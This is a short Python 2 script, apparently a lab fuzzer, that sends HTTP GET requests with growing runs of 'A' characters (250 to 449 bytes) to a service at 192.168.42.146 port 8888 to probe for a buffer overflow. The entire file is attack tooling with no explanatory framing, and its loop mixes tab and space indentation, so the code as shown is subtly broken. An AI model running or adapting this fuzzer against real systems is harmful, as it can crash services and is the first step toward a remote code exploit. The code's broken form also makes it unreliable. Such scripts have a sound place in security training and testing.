import sys, socket, time

ip = "192.168.42.146"
port = 8888

test = []
counter = 250

while len(test) < 200:
    test.append("A" * counter)
    counter += 1

for string in test:
        time.sleep(1)
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,port))
        print(len(string))
        s.send("GET " + "/" + string + " HTTP/1.1" + "\r\n\r\n")
	s.close()
